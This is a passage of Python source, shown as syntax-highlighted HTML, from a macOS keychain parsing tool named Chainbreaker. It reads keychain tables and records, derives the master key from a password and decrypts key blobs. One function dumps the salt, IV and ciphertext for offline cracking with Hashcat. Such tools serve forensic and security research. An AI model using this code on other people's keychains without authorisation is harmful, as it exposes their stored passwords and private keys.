</span></span><span style="display:flex;"><span>        schema_info <span style="color:#f92672">=</span> _APPL_DB_SCHEMA(self<span style="color:#f92672">.</span>kc_buffer[offset:offset <span style="color:#f92672">+</span> _APPL_DB_SCHEMA<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(schema_info<span style="color:#f92672">.</span>TableCount):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            base_addr <span style="color:#f92672">=</span> _APPL_DB_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size <span style="color:#f92672">+</span> _APPL_DB_SCHEMA<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            table_list<span style="color:#f92672">.</span>append(_TABLE_ID(self<span style="color:#f92672">.</span>kc_buffer[base_addr <span style="color:#f92672">+</span> (Chainbreaker<span style="color:#f92672">.</span>ATOM_SIZE <span style="color:#f92672">*</span> i):base_addr <span style="color:#f92672">+</span> (
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    Chainbreaker<span style="color:#f92672">.</span>ATOM_SIZE <span style="color:#f92672">*</span> i) <span style="color:#f92672">+</span> Chainbreaker<span style="color:#f92672">.</span>ATOM_SIZE])<span style="color:#f92672">.</span>Value)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> schema_info, table_list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Given a table name, return the offset for the table</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_table_offset</span>(self, table_name):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>table_list[self<span style="color:#f92672">.</span>table_enum[table_name]]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Returns a table, given the AppleFileDL CSSM_DB_RECORDTYPE from schema.py</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># (e.g. CSSM_DL_DB_RECORD_GENERIC_PASSWORD)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_table_from_type</span>(self, table_type):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_get_table(self<span style="color:#f92672">.</span>_get_table_offset(table_type))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Returns a both the metadata and a record list for a table, given an offset.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_table</span>(self, offset):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        record_list <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        base_addr <span style="color:#f92672">=</span> _APPL_DB_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size <span style="color:#f92672">+</span> offset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        table_metadata <span style="color:#f92672">=</span> _TABLE_HEADER(self<span style="color:#f92672">.</span>kc_buffer[base_addr:base_addr <span style="color:#f92672">+</span> _TABLE_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        record_offset_base <span style="color:#f92672">=</span> base_addr <span style="color:#f92672">+</span> _TABLE_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        record_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> table_metadata<span style="color:#f92672">.</span>RecordCount <span style="color:#f92672">!=</span> record_count:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            record_offset <span style="color:#f92672">=</span> _RECORD_OFFSET(self<span style="color:#f92672">.</span>kc_buffer[
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                           record_offset_base <span style="color:#f92672">+</span> (Chainbreaker<span style="color:#f92672">.</span>ATOM_SIZE <span style="color:#f92672">*</span> offset):record_offset_base <span style="color:#f92672">+</span> (
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                                   Chainbreaker<span style="color:#f92672">.</span>ATOM_SIZE <span style="color:#f92672">*</span> offset) <span style="color:#f92672">+</span> Chainbreaker<span style="color:#f92672">.</span>ATOM_SIZE])<span style="color:#f92672">.</span>Value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (record_offset <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x00</span>) <span style="color:#f92672">and</span> (record_offset <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                record_list<span style="color:#f92672">.</span>append(record_offset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                record_count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> table_metadata, record_list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Returns a dict of table indexes keyed off of the TableId</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_table_name_to_list</span>(self, record_list, table_list):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        table_dict <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> count <span style="color:#f92672">in</span> xrange(len(record_list)):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            table_metadata, generic_list <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_table(table_list[count])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            table_dict[table_metadata<span style="color:#f92672">.</span>TableId] <span style="color:#f92672">=</span> count  <span style="color:#75715e"># extract valid table list</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> len(record_list), table_dict
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_keyblob_record</span>(self, record_offset):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        base_addr <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_base_address(CSSM_DL_DB_RECORD_SYMMETRIC_KEY, record_offset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        key_blob_record_header <span style="color:#f92672">=</span> _KEY_BLOB_REC_HEADER(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>kc_buffer[base_addr:base_addr <span style="color:#f92672">+</span> _KEY_BLOB_REC_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        record <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>kc_buffer[
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                 base_addr <span style="color:#f92672">+</span> _KEY_BLOB_REC_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size:base_addr <span style="color:#f92672">+</span> key_blob_record_header<span style="color:#f92672">.</span>RecordSize]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        key_blob_record <span style="color:#f92672">=</span> _KEY_BLOB(record[:<span style="color:#f92672">+</span>_KEY_BLOB<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> SECURE_STORAGE_GROUP <span style="color:#f92672">!=</span> str(record[key_blob_record<span style="color:#f92672">.</span>TotalLength <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>:key_blob_record<span style="color:#f92672">.</span>TotalLength <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>]):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        cipher_len <span style="color:#f92672">=</span> key_blob_record<span style="color:#f92672">.</span>TotalLength <span style="color:#f92672">-</span> key_blob_record<span style="color:#f92672">.</span>StartCryptoBlob
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> cipher_len <span style="color:#f92672">%</span> Chainbreaker<span style="color:#f92672">.</span>BLOCKSIZE <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#34;Bad ciphertext length.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        cipher_text <span style="color:#f92672">=</span> record[key_blob_record<span style="color:#f92672">.</span>StartCryptoBlob:key_blob_record<span style="color:#f92672">.</span>TotalLength]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># match data, keyblob_ciphertext, Initial Vector, success</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> record[
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>               key_blob_record<span style="color:#f92672">.</span>TotalLength <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>:key_blob_record<span style="color:#f92672">.</span>TotalLength <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">20</span>], cipher_text, key_blob_record<span style="color:#f92672">.</span>IV, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get a timestamp from the keychain buffer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_keychain_time</span>(self, base_addr, pcol):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> pcol <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> _KEYCHAIN_TIME(self<span style="color:#f92672">.</span>kc_buffer[base_addr <span style="color:#f92672">+</span> pcol:base_addr <span style="color:#f92672">+</span> pcol <span style="color:#f92672">+</span> _KEYCHAIN_TIME<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])<span style="color:#f92672">.</span>Time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get an integer from the keychain buffer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_int</span>(self, base_addr, pcol):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> pcol <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> _INT(self<span style="color:#f92672">.</span>kc_buffer[base_addr <span style="color:#f92672">+</span> pcol:base_addr <span style="color:#f92672">+</span> pcol <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>])<span style="color:#f92672">.</span>Value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get 4 character code from the keychain buffer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_four_char_code</span>(self, base_addr, pcol):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> pcol <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> _FOUR_CHAR_CODE(self<span style="color:#f92672">.</span>kc_buffer[base_addr <span style="color:#f92672">+</span> pcol:base_addr <span style="color:#f92672">+</span> pcol <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>])<span style="color:#f92672">.</span>Value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get an lv from the keychain buffer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_lv</span>(self, base_addr, pcol):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> pcol <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        str_length <span style="color:#f92672">=</span> _INT(self<span style="color:#f92672">.</span>kc_buffer[base_addr <span style="color:#f92672">+</span> pcol:base_addr <span style="color:#f92672">+</span> pcol <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>])<span style="color:#f92672">.</span>Value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 4byte arrangement</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (str_length <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            real_str_len <span style="color:#f92672">=</span> (str_length <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            real_str_len <span style="color:#f92672">=</span> ((str_length <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> _LV(self<span style="color:#f92672">.</span>kc_buffer[base_addr <span style="color:#f92672">+</span> pcol <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>:base_addr <span style="color:#f92672">+</span> pcol <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> real_str_len], real_str_len)<span style="color:#f92672">.</span>Value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> struct<span style="color:#f92672">.</span>error:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#39;LV string length is too long.&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># # http://opensource.apple.com/source/libsecurity_keychain/libsecurity_keychain-55044/lib/KeyItem.cpp</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_private_key_decryption</span>(self, encryptedblob, iv):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        plain <span style="color:#f92672">=</span> Chainbreaker<span style="color:#f92672">.</span>_kcdecrypt(self<span style="color:#f92672">.</span>db_key, Chainbreaker<span style="color:#f92672">.</span>MAGIC_CMS_IV, encryptedblob)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> plain<span style="color:#f92672">.</span>__len__() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># now we handle the unwrapping. we need to take the first 32 bytes,</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># and reverse them.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        revplain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(plain)):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            revplain <span style="color:#f92672">+=</span> plain[len(plain) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> i]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># now the real key gets found. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        plain <span style="color:#f92672">=</span> Chainbreaker<span style="color:#f92672">.</span>_kcdecrypt(self<span style="color:#f92672">.</span>db_key, iv, revplain)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        keyname <span style="color:#f92672">=</span> plain[:<span style="color:#ae81ff">12</span>]  <span style="color:#75715e"># Copied Buffer when user click on right and copy a key on Keychain Access</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        keyblob <span style="color:#f92672">=</span> plain[<span style="color:#ae81ff">12</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> keyname, keyblob
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ## Documents : http://www.opensource.apple.com/source/securityd/securityd-55137.1/doc/BLOBFORMAT</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_generate_master_key</span>(self, pw):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> str(PBKDF2(pw, str(bytearray(self<span style="color:#f92672">.</span>dbblob<span style="color:#f92672">.</span>Salt)), <span style="color:#ae81ff">1000</span>, Chainbreaker<span style="color:#f92672">.</span>KEYLEN))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ## find DBBlob and extract Wrapping key</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_find_wrapping_key</span>(self, master):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># get cipher text area</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ciphertext <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>kc_buffer[
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                     self<span style="color:#f92672">.</span>base_addr <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>dbblob<span style="color:#f92672">.</span>StartCryptoBlob:self<span style="color:#f92672">.</span>base_addr <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>dbblob<span style="color:#f92672">.</span>TotalLength]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># decrypt the key</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        plain <span style="color:#f92672">=</span> Chainbreaker<span style="color:#f92672">.</span>_kcdecrypt(master, self<span style="color:#f92672">.</span>dbblob<span style="color:#f92672">.</span>IV, ciphertext)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> plain<span style="color:#f92672">.</span>__len__() <span style="color:#f92672">&lt;</span> Chainbreaker<span style="color:#f92672">.</span>KEYLEN:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dbkey <span style="color:#f92672">=</span> plain[:Chainbreaker<span style="color:#f92672">.</span>KEYLEN]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># return encrypted wrapping key</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> dbkey
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Extract the Cyphertext, IV, and Salt for the keychain file, for use with offline cracking (e.g. Hashcat)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Returns a KeychainPasswordHash object</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_keychain_password_hash</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        cyphertext <span style="color:#f92672">=</span> hexlify(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>kc_buffer[self<span style="color:#f92672">.</span>base_addr <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>dbblob<span style="color:#f92672">.</span>StartCryptoBlob:self<span style="color:#f92672">.</span>base_addr <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>dbblob<span style="color:#f92672">.</span>TotalLength])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        iv <span style="color:#f92672">=</span> hexlify(self<span style="color:#f92672">.</span>dbblob<span style="color:#f92672">.</span>IV)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        salt <span style="color:#f92672">=</span> hexlify(self<span style="color:#f92672">.</span>dbblob<span style="color:#f92672">.</span>Salt)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>KeychainPasswordHash(salt, iv, cyphertext)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Given a base address and offset (ID) of a record,</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_appleshare_record</span>(self, record_offset):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        base_addr <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_base_address(CSSM_DL_DB_RECORD_APPLESHARE_PASSWORD, record_offset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        record_meta <span style="color:#f92672">=</span> _APPLE_SHARE_HEADER(self<span style="color:#f92672">.</span>kc_buffer[base_addr:base_addr <span style="color:#f92672">+</span> _APPLE_SHARE_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
